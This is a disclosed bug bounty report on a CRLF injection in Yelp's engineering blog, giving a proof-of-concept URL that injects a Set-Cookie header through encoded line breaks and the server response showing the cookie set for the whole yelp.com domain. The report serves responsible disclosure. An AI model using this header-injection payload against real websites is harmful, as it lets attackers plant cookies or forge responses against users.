# [engineeringblog.yelp.com] CRLF Injection

## Report Details
- **Report ID**: 66391
- **URL**: https://hackerone.com/reports/66391
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2015-06-07T09:02:26.025Z
- **Disclosed**: 2017-11-09T20:12:42.951Z

## Reporter
- **Username**: bobrov
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: yelp

## Vulnerability Information
CRLF Injection via Request-URI

PoC:

```
https://engineeringblog.yelp.com/xxcrlftest%0d%0aSet-Cookie:%20test=test;domain=.yelp.com
```
HTTP Response:
```
HTTP/1.1 301 Moved Permanently
...
Location: http://engineeringblog.yelp.com/xxcrlftest
Set-Cookie: test=test;domain=.yelp.com
```
Result:
Creating a cookie-param "test=test" on *.yelp.com

## Attachments
No attachments
